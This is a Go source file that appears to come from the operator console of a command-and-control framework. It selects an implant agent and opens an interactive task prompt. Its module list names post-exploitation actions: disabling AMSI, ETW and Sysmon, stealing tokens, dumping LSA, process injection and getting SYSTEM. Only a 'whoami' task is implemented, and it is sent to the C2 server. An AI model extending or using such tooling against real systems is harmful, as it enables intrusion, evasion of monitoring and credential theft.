package cmd

import (
	"bufio"
	"errors"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/desertbit/grumble"
	"github.com/latortuga71/MeowthCoreCLI/internal"
	"github.com/manifoldco/promptui"
)

var modules = [...]string{
	"?",
	"help",
	"exit",
	"whoami",
	"runas",
	"run",
	"shell",
	"shinject",
	"admin-check",
	"cd",
	"mkdir",
	"rmdir",
	"disable-amsi",
	"disable-etw",
	"disable-sysmon",
	"enable-priv",
	"execute-assembly",
	"get-system",
	"ls",
	"ps",
	"lsa",
	"ping-sweep",
	"pwd",
	"rev2self",
	"spawn-inject",
	"steal-token",
	"turtle-dump",
	"TestCommand",
}

func init(){
    interactCommand := &grumble.Command{
        Name:"interact",
        Help: "choose an agent to task",
        Run: chooseAgent,
    }
    App.AddCommand(interactCommand)
}


func chooseAgent(c *grumble.Context) error {
    if (len(AgentList.agents) == 0){
        return errors.New("No Agents Online.") 
    }
	prompt := promptui.Select{
		Label: "Select Agent",
		Items: AgentList.agents,
	}
	idx, _, err := prompt.Run()
	if err != nil {
		return err
	}
	CurrentAgent = &AgentList.agents[idx]
	agentShell()
    return nil
}

func agentShell() error {
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Printf(CurrentAgent.Metadata.Username+ "@" + CurrentAgent.Metadata.Hostname+ " > ")
		tmp, err := reader.ReadString('\n')
		if err != nil {
			CurrentAgent = nil
			return err
		}
		cmd := strings.TrimRight(tmp, "\n")
		switch cmd {
		case "exit":
			fmt.Println("Exiting...")
			CurrentAgent = nil
			return nil
		case "exit\r":
			fmt.Println("Exiting...")
			CurrentAgent = nil
			return nil
		case "help":
			showModules()	
			break
		case "?":
			showModules()	
			break
		default:
			handleTask(cmd)
			break
		}
		time.Sleep(time.Millisecond * 500)
	}
}

func showModules(){
	fmt.Println("### Modules ###")
	for x := range modules{
		fmt.Println(modules[x])
	}
}

func handleTask(cmd string) error {
	switch cmd {
	case "whoami":
		return handleSimpleTask(cmd)
	default:
		fmt.Println(cmd)
		break
	}
	return nil
}
// simple only sends taskname
// medium send taskname and args
// comples sends args taskname and base64 encoded file
func handleSimpleTask(cmd string) error {
	task := &Task{
		Command: cmd,
	}
	target := fmt.Sprintf("%s%s%s",FullServerURI,"Agents/",CurrentAgent.Metadata.ID)
	err,taskid:= internal.PostTask(target,&task)	
	if err != nil {
		return err
	}
	fmt.Printf("%+v\n",taskid)
	// add taskid to pending tasks Queue
	return nil 
}


func handleMediumTask(){}
func handleComplexTask(){}




